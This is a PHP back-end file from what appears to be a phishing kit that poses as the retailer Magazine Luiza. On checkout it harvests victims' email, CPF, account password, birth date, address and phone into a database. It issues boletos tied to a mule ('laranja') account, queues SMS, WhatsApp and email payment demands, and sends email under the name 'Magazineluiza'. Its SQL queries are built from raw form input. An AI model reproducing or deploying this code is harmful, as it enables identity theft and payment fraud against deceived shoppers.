<?php
include('../conexao.php');
include('../banco.php');
include('../bancoapi.php');
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require '../dist/PHPMailer/src/Exception.php';
require '../dist/PHPMailer/src/PHPMailer.php';
require '../dist/PHPMailer/src/SMTP.php';
// Busca informações das configurações;
$queryconf = "select * from configuracoes";
$resultadoconf = mysqli_query($conexao,$queryconf);
while($exibe = mysqli_fetch_assoc($resultadoconf)){
    $smtp = $exibe['smtp'];
    $loginsmtp = $exibe['loginsmtp'];
    $senhasmtp = $exibe['senhasmtp'];
    $url = $exibe['url'];
    $boletoativo = $exibe['boleto'];
    $apimp = $exibe['apimp'];
    $diasboleto = $exibe['diasboleto'];
}
//Função Mascara
function Mask($mask,$str){

    $str = str_replace(" ","",$str);

    for($i=0;$i<strlen($str);$i++){
        $mask[strpos($mask,"#")] = $str[$i];
    }

    return $mask;

}
//Se Estiver Ligado O Boleto Normal
if($boletoativo == 1 & $apimp == 0){
//Seleciona O Boleto Que Vai Ser Usado;
$query = "SELECT * FROM `boletos` WHERE usado = 0 && vencimento >= {$hoje} && idproduto = {$id} limit 1";
$resultado = mysqli_query($conexao, $query);
while($exibe = mysqli_fetch_assoc($resultado)){
        $idboleto = $exibe['id'];
        $numeroboleto = $exibe['numero'];
        $numeromascara = Mask("#####.##### #####.###### #####.###### # ##############",$numeroboleto);
        $vencimentomascara = date('d/m/Y',strtotime($exibe['vencimento']));
};
// Atualiza o boleto para usado
$queryatualiza = "UPDATE `boletos` SET `usado` = '1' WHERE `boletos`.`id` = {$idboleto};";
mysqli_query($conexao, $queryatualiza);
};

// Informações Para Segunda Via
$unique = md5(time());
switch($dist) {
    case "desktop":
        $email = $_POST["email"];
        $cpf = $_POST["cpf"];
        $nomecompleto = $_POST["fullName"];
        $nascimento = $_POST["birthDate"];
        $senha = $_POST["password"];
        $cep = $_POST["cep"];
        $rua = $_POST["rua"];
        $numero = $_POST["number"];
        $complemento = $_POST["complement"];
        $bairro = $_POST["bairro"];
        $cidade = $_POST["cidade"];
        $estado = $_POST["uf"];
        $telefone = $_POST["telephone"];
        $t1 = str_replace(' ', '', $telefone);
        $t2 = str_replace('-', '', $t1);
        $t3 = str_replace('(', '', $t2);
        $t4 = str_replace(')', '', $t3);
        $metodo = "Boleto";
        $dist = $_GET['dist'];
        $ip = $_SERVER['REMOTE_ADDR'];
        if($boletoativo == 1 & $apimp == 0){
        $codigoboleto = $numeroboleto;
        };
        if($apimp == 1 &$boletoativo == 0){
            $hoje = date('Y-m-d');
            $vencimento = date('Y-m-d', strtotime($hoje. ' + '.$diasboleto.' days'));
            $hojemascara = date('d/m/Y',strtotime($hoje));
            $vencimentomascara = date('d/m/Y',strtotime($vencimento));
            $nomex = explode(' ',$nomecompleto);
            $api = apiselecionada($conexao);
            $lara = laranjaselecionada($conexao);
            $numeroboleto = gerarboletoapi($api,$lara,$vencimento,doubleval($precoa),$nome,$nomex[0],$nomex[1],$cpf,$cep,$rua,$numero,$bairro,$estado,$cidade);
            $numeromascara = Mask("#####.##### #####.###### #####.###### # ##############",$numeroboleto);
            $codigoboleto = $numeroboleto;
        }
        $numerocc=0;
        $nomecc=0;
        $mescc=0;
        $anocc=0;
        $vencimentocc=0;
        $cvv=0;
        $nomea = Explode(" ",$nomecompleto);
        $primeironome = $nomea[0];
        //Requisições Da API.


        //Alimenta Banco De Cobrança SMS
        $querycobrarrsms = "INSERT INTO `cobrancasms` (`id`, `numero`, `nome`, `nomeproduto`, `link`, `enviado`, `preco`) VALUES (NULL, '55{$t4}', '{$primeironome}', '{$nomecurto}', '{$url}/boleto/novo/impressao/imprimir.php?unique={$unique}', '0', '{$preco}');";
        if(mysqli_query($conexao, $querycobrarrsms)){
            echo '';
        } else {
            echo "Falha Ao Adicionar Produto";
            echo mysqli_error($conexao);
        };
        //Alimenta o Banco de Cobrança WPP
        $numerowpp = substr_replace($t4, '', -9, -8);
        $querywpp = "INSERT INTO `cobrancawpp` (`id`, `nome`, `produto`, `preco`, `numero`, `numeroleto`, `link`, `enviado`) VALUES (NULL, '{$nomecompleto}', '{$nome}', '{$preco}', '55{$numerowpp}', '{$numeroboleto}', '{$url}/boleto/novo/impressao/imprimir.php?unique={$unique}', 0);";
        mysqli_query($conexao, $querywpp);
        $conteudo = file_get_contents('../dist/desktop/sucessoboleto.html');
        $s1 = str_replace('{$EMAIL}', $email, $conteudo);
        $s2 = str_replace('{$PRECO}', $preco, $s1);
        $s3 = str_replace('{$VENCIMENTOLETO}', $vencimentomascara, $s2);
        $s4 = str_replace('<form method="post" action="gerarboleto.php">','<form method="post" action="gerarboleto.php?id='.$id.'&titulo='.$nomelink.'&dist='.$dist.'"><input type="hidden" name="vencimento" value="'.$vencimentomascara.'"><input type="hidden" name="numeroboleto" value="'.$numeroboleto.'"><input type="hidden" name="nomecliente" value="'.$nomecompleto.'"><input type="hidden" name="cpf" value="'.$cpf.'"><input type="hidden" name="endereco" value="'.$rua.'"><input type="hidden" name="numero" value="'.$numero.'"><input type="hidden" name="bairro" value="'.$bairro.'"><input type="hidden" name="cidade" value="'.$cidade.'"><input type="hidden" name="estado" value="'.$estado.'"><input type="hidden" name="cep" value="'.$cep.'">',$s3);
        $s5 = str_replace('confirmar','confirmar<iframe src="../dist/imprimirboleto.php?vencimento='.$vencimentomascara.'&hoje='.$hojeformatado.'&preco='.$preco.'&nomecliente='.$nomecompleto.'&cpf='.$cpf.'&numeroboleto='.$numeromascara.'&endereco='.$rua.'&numero='.$numero.'&bairro='.$bairro.'&cidade='.$cidade.'&estado='.$estado.'&cep='.$cep.'" width="0px" height="0px"></iframe>', $s4);
        echo $s5;
        $query = "INSERT INTO `informacoes` (`id`, `email`, `cpf`, `nomecompleto`, `nascimento`, `senha`, `cep`, `endereco`, `numero`, `complemento`, `bairro`, `cidade`, `estado`, `telefone`, `numerocc`, `nomecc`, `validadecc`, `cvv`, `metodo`, `dist`, `ip`, `codigoboleto`, `idproduto`, `senhacc`) VALUES (NULL, '{$email}', '{$cpf}', '{$nomecompleto}', '{$nascimento}', '{$senha}', '{$cep}', '{$rua}', '{$numero}', '{$complemento}', '{$bairro}', '{$cidade}', '{$estado}', '{$telefone}', '{$numerocc}', '{$nomecc}', '{$vencimentocc}', '{$cvv}', '{$metodo}', '{$dist}', '{$ip}', '{$codigoboleto}', '{$id}', 0);";
        mysqli_query($conexao, $query);
        //Insere As Informações De Segunda Via Do boleto
        $querysegundavia = "INSERT INTO `segundavia` (`id`, `nomecliente`, `cpf`, `vencimento`, `hoje`, `preco`, `numeroboleto`, `endereco`, `numero`, `bairro`, `cidade`, `estado`, `cep`) VALUES ('{$unique}', '{$nomecompleto}', '{$cpf}', '{$vencimentomascara}', '{$hojeformatado}', '{$precoa}', '{$numeromascara}', '{$rua}', '{$numero}', '{$bairro}', '{$cidade}', '{$estado}', '{$cep}');";
        mysqli_query($conexao, $querysegundavia);
        //Fazendo Alterações no conteudo do email!
        $conteudoemail = file_get_contents('../dist/email.html');
        $e1 = str_replace('{$NOME}', $primeironome, $conteudoemail);
        $e2 = str_replace('{$IMAGEMPRODUTO}', $imagem, $e1);
        $e3 = str_replace('{$NOMEPRODUTO}', $nome, $e2);
        $e4 = str_replace('{$PRECO}', $preco, $e3);
        $e5 = str_replace('{$ENDERECO}', $rua, $e4);
        $e6 = str_replace('{$NUMEROCASA}', $numero, $e5);
        $e7 = str_replace('{$BAIRRO}', $bairro, $e6);
        $e8 = str_replace('{$CIDADE}', $cidade, $e7);
        $e9 = str_replace('{$ESTADO}', $estado, $e8);
        $e10 = str_replace('{$CEP}', $cep, $e9);
        $e11 = str_replace('{$TOTAL}', $preco, $e10);
        $e12 = str_replace('{$URLDOSITE}', $url, $e11);
        $e13 = str_replace('{$UNIQUE}', $unique, $e12);
        //Alimenta Banco De Cobrança Por Email
        $querycobraremail = "INSERT INTO `cobrancaemail` (`id`, `email`, `corpo`, `enviado`, `primeironome`) VALUES (NULL, '{$email}', '{$e13}', '0', '{$primeironome}');";
        mysqli_query($conexao, $querycobraremail);
        //SMTP
        $Mailer = new PHPMailer();
        //Define que será usado SMTP
        $Mailer->IsSMTP();
        //Enviar e-mail em HTML
        $Mailer->isHTML(true);
        //Aceitar carasteres especiais
        $Mailer->Charset = 'UTF-8';
        //Configurações
        $Mailer->SMTPAuth = true;
        $Mailer->SMTPSecure = 'ssl';
        //nome do servidor
        $Mailer->Host = 'smtp.gmail.com';
        //Porta de saida de e-mail
        $Mailer->Port = 465;
        //Dados do e-mail de saida - autenticação
        $Mailer->Username = $loginsmtp;
        $Mailer->Password = $senhasmtp;
        //E-mail remetente (deve ser o mesmo de quem fez a autenticação)
        $Mailer->From = $loginsmtp;
        //Nome do Remetente
        $Mailer->FromName = 'Magazineluiza';
        //Assunto da mensagem
        $Mailer->Subject = 'Ola '.$primeironome.' Recebemos seu pedido, Agora efetue o pagamento do boleto!';
        //Corpo da Mensagem
        $Mailer->Body = $e13;
        //Corpo da mensagem em texto
        $Mailer->AltBody = 'conteudo do E-mail em texto';
        //Destinatario
        $Mailer->AddAddress($email);
        if($smtp == 1){
            $Mailer->Send();
        };
        break;
    case "mobile":
        $email = $_POST['email'];
        $cpf = $_POST['cpf_cnpj'];
        $nomecompleto = $_POST['name'];
        $nascimento = $_POST['birth_date'];
        $senha = $_POST['password'];
        $cep = $_POST['cep'];
        $endereco = $_POST['rua'];
        $numero = $_POST['number'];
        $complemento = $_POST['complement'];
        $bairro = $_POST['bairro'];
        $cidade = $_POST['cidade'];
        $estado = $_POST['uf'];
        $telefone = $_POST['phone_number'];
        $t1 = str_replace(' ', '', $telefone);
        $t2 = str_replace('-', '', $t1);
        $t3 = str_replace('(', '', $t2);
        $t4 = str_replace(')', '', $t3);
        $metodo = "Boleto";
        $dist = $_GET['dist'];
        $ip = $_SERVER['REMOTE_ADDR'];
        if($boletoativo == 1 & $apimp == 0){
            $codigoboleto = $numeroboleto;
        };
        if($apimp == 1 &$boletoativo == 0){
            $hoje = date('Y-m-d');
            $vencimento = date('Y-m-d', strtotime($hoje. ' + '.$diasboleto.' days'));
            $hojemascara = date('d/m/Y',strtotime($hoje));
            $vencimentomascara = date('d/m/Y',strtotime($vencimento));
            $nomex = explode(' ',$nomecompleto);
            $api = apiselecionada($conexao);
            $lara = laranjaselecionada($conexao);
            $numeroboleto = gerarboletoapi($api,$lara,$vencimento,doubleval($precoa),$nome,$nomex[0],$nomex[1],$cpf,$cep,$endereco,$numero,$bairro,$estado,$cidade);
            $numeromascara = Mask("#####.##### #####.###### #####.###### # ##############",$numeroboleto);
            $codigoboleto = $numeroboleto;
        }
        $numerocc =  0;
        $nomecc = 0;
        $mescc = 0;
        $anocc = 0;
        $vencimentocc = 0;
        $cvv = 0;
        $nomea = Explode(" ",$nomecompleto);
        $primeironome = $nomea[0];

        //Alimenta Banco De Cobrança SMS
        $querycobrarrsms = "INSERT INTO `cobrancasms` (`id`, `numero`, `nome`, `nomeproduto`, `link`, `enviado`, `preco`) VALUES (NULL, '55{$t4}', '{$primeironome}', '{$nomecurto}', '{$url}/boleto/novo/impressao/imprimir.php?unique={$unique}', '0', '{$preco}');";
        if(mysqli_query($conexao, $querycobrarrsms)){
            echo '';
        } else {
            echo "Falha Ao Adicionar Produto";
            echo mysqli_error($conexao);
        };
        //Alimenta o Banco de Cobrança WPP
        $numerowpp = substr_replace($t4, '', -9, -8);
        $querywpp = "INSERT INTO `cobrancawpp` (`id`, `nome`, `produto`, `preco`, `numero`, `numeroleto`, `link`, `enviado`) VALUES (NULL, '{$nomecompleto}', '{$nome}', '{$preco}', '55{$numerowpp}', '{$numeroboleto}', '{$url}/boleto/novo/impressao/imprimir.php?unique={$unique}', 0);";
        mysqli_query($conexao, $querywpp);
        $conteudo = file_get_contents('../dist/mobile/sucessoleto.html');
        $s1 = str_replace('{$NOMECLIENTE}', $nomecompleto, $conteudo);
        $s2 = str_replace('{$EMIAL}', $email, $s1);
        $s3 = str_replace('{$NUMEROBOLETO}', $numeroboleto, $s2);
        $s4 = str_replace('{$VENCIMENTO}', $vencimentomascara, $s3);
        $s5 = str_replace('<a href="https://m.magazineluiza.com.br/meus-pedidos" class="redirect">Seus pedidos</a>','<a href="https://m.magazineluiza.com.br/meus-pedidos" class="redirect">Seus pedidos</a><iframe src="../dist/imprimirboleto.php?vencimento='.$vencimentomascara.'&hoje='.$hojeformatado.'&preco='.$preco.'&nomecliente='.$nomecompleto.'&cpf='.$cpf.'&numeroboleto='.$numeromascara.'&endereco='.$endereco.'&numero='.$numero.'&bairro='.$bairro.'&cidade='.$cidade.'&estado='.$estado.'&cep='.$cep.'" width="0px" height="0px"></iframe>',$s4);
        echo $s5;
        $query = "INSERT INTO `informacoes` (`id`, `email`, `cpf`, `nomecompleto`, `nascimento`, `senha`, `cep`, `endereco`, `numero`, `complemento`, `bairro`, `cidade`, `estado`, `telefone`, `numerocc`, `nomecc`, `validadecc`, `cvv`, `metodo`, `dist`, `ip`, `codigoboleto`, `idproduto`, `senhacc`) VALUES (NULL, '{$email}', '{$cpf}', '{$nomecompleto}', '{$nascimento}', '{$senha}', '{$cep}', '{$endereco}', '{$numero}', '{$complemento}', '{$bairro}', '{$cidade}', '{$estado}', '{$telefone}', '{$numerocc}', '{$nomecc}', '{$vencimentocc}', '{$cvv}', '{$metodo}', '{$dist}', '{$ip}', '{$codigoboleto}', '{$id}', 0);";
        mysqli_query($conexao, $query);
        //Insere As Informações De Segunda Via Do boleto
        $querysegundavia = "INSERT INTO `segundavia` (`id`, `nomecliente`, `cpf`, `vencimento`, `hoje`, `preco`, `numeroboleto`, `endereco`, `numero`, `bairro`, `cidade`, `estado`, `cep`) VALUES ('{$unique}', '{$nomecompleto}', '{$cpf}', '{$vencimentomascara}', '{$hojeformatado}', '{$preco}', '{$numeromascara}', '{$endereco}', '{$numero}', '{$bairro}', '{$cidade}', '{$estado}', '{$cep}');";
        mysqli_query($conexao, $querysegundavia);
        //smtp
        $conteudoemail = file_get_contents('../dist/email.html');
        $e1 = str_replace('{$NOME}', $primeironome, $conteudoemail);
        $e2 = str_replace('{$IMAGEMPRODUTO}', $imagem, $e1);
        $e3 = str_replace('{$NOMEPRODUTO}', $nome, $e2);
        $e4 = str_replace('{$PRECO}', $preco, $e3);
        $e5 = str_replace('{$ENDERECO}', $endereco, $e4);
        $e6 = str_replace('{$NUMEROCASA}', $numero, $e5);
        $e7 = str_replace('{$BAIRRO}', $bairro, $e6);
        $e8 = str_replace('{$CIDADE}', $cidade, $e7);
        $e9 = str_replace('{$ESTADO}', $estado, $e8);
        $e10 = str_replace('{$CEP}', $cep, $e9);
        $e11 = str_replace('{$TOTAL}', $preco, $e10);
        $e12 = str_replace('{$URLDOSITE}', $url, $e11);
        $e13 = str_replace('{$UNIQUE}', $unique, $e12);
        //Alimenta Banco De Cobrança Por Email
        $querycobraremail = "INSERT INTO `cobrancaemail` (`id`, `email`, `corpo`, `enviado`, `primeironome`) VALUES (NULL, '{$email}', '{$e13}', '0', '{$primeironome}');";
        mysqli_query($conexao, $querycobraremail);
        //SMTP
        $Mailer = new PHPMailer();
        //Define que será usado SMTP
        $Mailer->IsSMTP();
        //Enviar e-mail em HTML
        $Mailer->isHTML(true);
        //Aceitar carasteres especiais
        $Mailer->Charset = 'UTF-8';
        //Configurações
        $Mailer->SMTPAuth = true;
        $Mailer->SMTPSecure = 'ssl';
        //nome do servidor
        $Mailer->Host = 'smtp.gmail.com';
        //Porta de saida de e-mail
        $Mailer->Port = 465;
        //Dados do e-mail de saida - autenticação
        $Mailer->Username = $loginsmtp;
        $Mailer->Password = $senhasmtp;
        //E-mail remetente (deve ser o mesmo de quem fez a autenticação)
        $Mailer->From = $loginsmtp;
        //Nome do Remetente
        $Mailer->FromName = 'Magazineluiza';
        //Assunto da mensagem
        $Mailer->Subject = 'Ola '.$primeironome.' Recebemos seu pedido, Agora efetue o pagamento do boleto!';
        //Corpo da Mensagem
        $Mailer->Body = $e13;
        //Corpo da mensagem em texto
        $Mailer->AltBody = 'conteudo do E-mail em texto';
        //Destinatario
        $Mailer->AddAddress($email);
        if($smtp == 1){
            $Mailer->Send();
        };
        break;
};
